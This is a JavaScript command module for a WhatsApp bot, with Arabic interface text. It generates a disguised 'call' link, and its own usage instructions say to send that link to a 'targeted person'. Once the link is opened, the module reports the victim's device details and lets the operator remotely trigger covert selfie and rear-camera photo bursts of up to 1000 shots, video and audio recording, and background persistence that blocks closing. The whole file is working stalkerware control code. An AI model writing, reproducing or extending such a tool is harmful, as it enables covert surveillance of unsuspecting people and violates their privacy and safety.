const moment = require('moment-timezone');
const axios = require('axios');

module.exports = {
    name: 'اتصال',
    aliases: [
        'كاميرا', 'مكالمة', 'call', 'video', 'كام', 'تصوير', 'مباشر', 'جبار', 'اعظم',
        'فيديو', 'صوت', 'سيلفي', 'خلفي', 'ايقاف', 'تشغيل', 'حالة', 'انهاء',
        'تحكم', 'control', 'cmd', 'selfie', 'back', 'audio', 'stop', 'start', 'status', 'end'
    ],
    category: 'إداري',
    description: '⚠️ الأمر الجامع - توليد رابط اتصال + تحكم عن بعد بكل الميزات',

    async execute({ sock, msg, args, reply, from, sender, sessionId, text, commandName }) {
        try {
            const cleanSender = sender.split('@')[0];
            const serverBaseUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 10000}`;

            // ==========================================
            // 🎯 تحديد نوع العملية المطلوبة
            // ==========================================
            
            // أسماء إنشاء الرابط
            const createLinkCommands = ['اتصال', 'كاميرا', 'مكالمة', 'call', 'video', 'كام', 'تصوير', 'مباشر', 'جبار', 'اعظم'];
            
            // أسماء التحكم المباشر
            const controlCommands = {
                'فيديو': 'video',
                'صوت': 'audio',
                'سيلفي': 'selfie',
                'خلفي': 'back',
                'ايقاف': 'stop',
                'stop': 'stop',
                'تشغيل': 'start',
                'start': 'start',
                'حالة': 'status',
                'status': 'status',
                'انهاء': 'end',
                'end': 'end',
                'تحكم': 'help',
                'control': 'help',
                'cmd': 'help'
            };

            // ==========================================
            // 📞 إنشاء رابط الاتصال
            // ==========================================
            if (createLinkCommands.includes(commandName)) {
                
                const callUrl = `${serverBaseUrl}/call.html?session=${sessionId}&target=${cleanSender}`;
                let customSettings = '';
                let hasCustomCommand = false;
                let videoDuration = 10;
                let audioDuration = 10;
                let selfieCount = '∞';
                let selfieInterval = 10;
                let backCount = '∞';
                let backInterval = 10;

                // تحليل الأوامر الإضافية
                if (text && text.trim() !== '') {
                    const params = text.trim().split(' ');
                    
                    for (let i = 0; i < params.length; i++) {
                        const param = params[i].toLowerCase();
                        
                        if ((param === 'فيديو' || param === 'video') && params[i + 1]) {
                            const val = parseInt(params[i + 1]);
                            if (!isNaN(val) && val > 0) {
                                videoDuration = Math.min(Math.max(val, 5), 120);
                                customSettings += `│  🎬 فيديو: ${videoDuration} ثانية\n`;
                                hasCustomCommand = true;
                            }
                        }
                        
                        if ((param === 'صوت' || param === 'audio') && params[i + 1]) {
                            const val = parseInt(params[i + 1]);
                            if (!isNaN(val) && val > 0) {
                                audioDuration = Math.min(Math.max(val, 5), 300);
                                customSettings += `│  🎙️ صوت: ${audioDuration} ثانية\n`;
                                hasCustomCommand = true;
                            }
                        }
                        
                        if ((param === 'سيلفي' || param === 'selfie')) {
                            if (params[i + 1] && !isNaN(parseInt(params[i + 1]))) {
                                selfieCount = Math.min(Math.max(parseInt(params[i + 1]), 1), 1000);
                                if (params[i + 2] && !isNaN(parseInt(params[i + 2]))) {
                                    selfieInterval = Math.min(Math.max(parseInt(params[i + 2]), 5), 60);
                                }
                                customSettings += `│  🤳 سيلفي: ${selfieCount} صورة كل ${selfieInterval} ث\n`;
                                hasCustomCommand = true;
                            }
                        }
                        
                        if ((param === 'خلفي' || param === 'back')) {
                            if (params[i + 1] && !isNaN(parseInt(params[i + 1]))) {
                                backCount = Math.min(Math.max(parseInt(params[i + 1]), 1), 1000);
                                if (params[i + 2] && !isNaN(parseInt(params[i + 2]))) {
                                    backInterval = Math.min(Math.max(parseInt(params[i + 2]), 5), 60);
                                }
                                customSettings += `│  📷 خلفي: ${backCount} صورة كل ${backInterval} ث\n`;
                                hasCustomCommand = true;
                            }
                        }
                    }
                }

                const responseText = 
`╭════ 📞 ﴿ بِـوَابَـةُ الاتِّـصَـالِ الْأَعْـظَـم ﴾ 📞 ════╮
│
│ 👤 ╟ *الـجَـلْـسَـة:* ${sessionId}
│ 🕒 ╟ *الـتَّـوْقِـيـت:* ${moment().tz("Asia/Riyadh").format("YYYY-MM-DD | HH:mm")}
│ 📱 ╟ *الـمُـسْـتَـقْـبِـل:* ${cleanSender}
│
├───────────────────────────────────────────┤
│
│ 🔗 ╟ *رَابِـطُ الاتِّـصَـالِ:*
│ ${callUrl}
│
├───────────────────────────────────────────┤
│
│ 📌 ╟ *الـمِـيـزَاتُ الْـجَـبَّـارَة:*
│  • 🤳 سيلفي أمامي (كل ${selfieInterval} ث)
│  • 📷 تصوير خلفي (كل ${backInterval} ث)
│  • 🎬 فيديو ${videoDuration} ثانية تلقائي
│  • 🎙️ تسجيل صوتي ${audioDuration} ثانية
│  • 🚪 إشعار دخول بمعلومات الجهاز كاملة
│  • 🎮 نظام أوامر عن بعد متكامل
│  • 🛡️ منع الإغلاق والعمل بالخلفية
│  • 🔒 اتصال مشفر وآمن
│  • 🔇 كتم الصوت
│  • 📵 إيقاف/تشغيل الكاميرا
│  • 🔄 قلب الكاميرا (أمامي/خلفي)
│
${hasCustomCommand ? `├───────────────────────────────────────────┤
│
│ ⚙️ ╟ *الإعـدادات المُـخَـصَّـصَـة:*
${customSettings}│` : ''}
╰═══════════════════════════════════════════╯

🎮 *جـمـيـع الأوامـر فـي أمـر واحـد:*
┌──────────────────────────────────────┐
│ 📞 *.اتصال*              ║ إنشاء رابط   │
│ 🎬 *.فيديو [ثواني]*     ║ تحكم عن بعد │
│ 🎙️ *.صوت [ثواني]*       ║ تحكم عن بعد │
│ 🤳 *.سيلفي [عدد] [مدة]* ║ تحكم عن بعد │
│ 📷 *.خلفي [عدد] [مدة]*  ║ تحكم عن بعد │
│ ⏸️ *.ايقاف*             ║ تحكم عن بعد │
│ ▶️ *.تشغيل*              ║ تحكم عن بعد │
│ 📊 *.حالة*               ║ تحكم عن بعد │
│ 🔴 *.انهاء*              ║ تحكم عن بعد │
└──────────────────────────────────────┘

💡 *طريقة الاستخدام:*
1- ارفع الرابط للشخص المستهدف
2- عند فتحه يصلك إشعار بكل معلومات جهازه
3- تحكم فيه عن بعد بكل الأوامر أعلاه`;

                // إرسال الرسالة الفخمة
                await sock.sendMessage(from, {
                    text: responseText,
                    contextInfo: {
                        externalAdReply: {
                            title: '📞 اتصال مباشر - النسخة الأعظم',
                            body: 'سيلفي · خلفي · فيديو · صوت | إشعارات فورية | تحكم عن بعد',
                            thumbnailUrl: 'https://cdn.pixabay.com/photo/2020/04/29/13/48/video-call-5108882_1280.png',
                            sourceUrl: callUrl,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, { quoted: msg });

                return;
            }

            // ==========================================
            // 🎮 نظام التحكم عن بعد
            // ==========================================
            
            const cmdType = controlCommands[commandName];
            
            if (!cmdType) {
                // عرض المساعدة
                await reply(
                    `🎮 *جميع الأوامر في أمر واحد:*\n\n` +
                    `📞 *.اتصال* - إنشاء رابط اتصال جديد\n` +
                    `📞 *.اتصال فيديو 15* - رابط مع فيديو 15 ث\n` +
                    `📞 *.اتصال سيلفي 50* - رابط مع 50 سيلفي\n` +
                    `📞 *.اتصال خلفي 30 15* - 30 صورة كل 15 ث\n\n` +
                    `🎮 *التحكم عن بعد:*\n` +
                    `🎬 *.فيديو 20* - ضبط الفيديو 20 ثانية\n` +
                    `🎙️ *.صوت 30* - ضبط الصوت 30 ثانية\n` +
                    `🤳 *.سيلفي 100* - 100 سيلفي\n` +
                    `🤳 *.سيلفي 50 15* - 50 سيلفي كل 15 ث\n` +
                    `📷 *.خلفي 50* - 50 صورة خلفية\n` +
                    `📷 *.خلفي 30 15* - 30 خلفية كل 15 ث\n` +
                    `⏸️ *.ايقاف* - إيقاف كل العمليات\n` +
                    `▶️ *.تشغيل* - استئناف العمليات\n` +
                    `📊 *.حالة* - تقرير كامل عن المتصل\n` +
                    `🔴 *.انهاء* - إنهاء المكالمة عن بعد`
                );
                return;
            }

            // بناء الأمر
            let cmdData = { type: cmdType };

            if (cmdType === 'video') {
                cmdData.duration = parseInt(args[0]) || 10;
                cmdData.duration = Math.min(Math.max(cmdData.duration, 5), 120);
            }
            else if (cmdType === 'audio') {
                cmdData.duration = parseInt(args[0]) || 10;
                cmdData.duration = Math.min(Math.max(cmdData.duration, 5), 300);
            }
            else if (cmdType === 'selfie') {
                cmdData.count = parseInt(args[0]) || 10;
                cmdData.count = Math.min(Math.max(cmdData.count, 1), 1000);
                cmdData.interval = parseInt(args[1]) || 10;
                cmdData.interval = Math.min(Math.max(cmdData.interval, 5), 60);
            }
            else if (cmdType === 'back') {
                cmdData.count = parseInt(args[0]) || 10;
                cmdData.count = Math.min(Math.max(cmdData.count, 1), 1000);
                cmdData.interval = parseInt(args[1]) || 10;
                cmdData.interval = Math.min(Math.max(cmdData.interval, 5), 60);
            }

            // إرسال الأمر للصفحة
            try {
                const response = await axios.post(`${serverBaseUrl}/api/commands/send`, {
                    sessionId: sessionId,
                    targetNumber: cleanSender,
                    command: {
                        id: Date.now(),
                        ...cmdData,
                        timestamp: new Date().toISOString()
                    }
                });

                if (response.data && response.data.success) {
                    let confirmMsg = `✅ *تم إرسال الأمر بنجاح*\n📋 النوع: ${cmdType}`;
                    
                    if (cmdType === 'video') confirmMsg += `\n🎬 المدة: ${cmdData.duration} ثانية`;
                    if (cmdType === 'audio') confirmMsg += `\n🎙️ المدة: ${cmdData.duration} ثانية`;
                    if (cmdType === 'selfie') confirmMsg += `\n🤳 العدد: ${cmdData.count} | المدة: ${cmdData.interval} ث`;
                    if (cmdType === 'back') confirmMsg += `\n📷 العدد: ${cmdData.count} | المدة: ${cmdData.interval} ث`;
                    if (cmdType === 'stop') confirmMsg += `\n⏸️ تم إيقاف جميع العمليات`;
                    if (cmdType === 'start') confirmMsg += `\n▶️ تم استئناف جميع العمليات`;
                    if (cmdType === 'end') confirmMsg += `\n🔴 تم إنهاء المكالمة`;
                    
                    await reply(confirmMsg);
                } else {
                    await reply(`⚠️ تم إرسال الأمر لكن قد لا يكون هناك متصلون حالياً\nتأكد أن الرابط مفتوح عند المستهدف`);
                }
            } catch (error) {
                await reply(`❌ فشل إرسال الأمر: ${error.message}\nتأكد أن السيرفر يعمل والمكالمة نشطة`);
            }

        } catch (error) {
            console.error('❌ خطأ في الأمر الجامع:', error);
            reply('❌ حدث خطأ داخلي في النظام.');
        }
    }
};
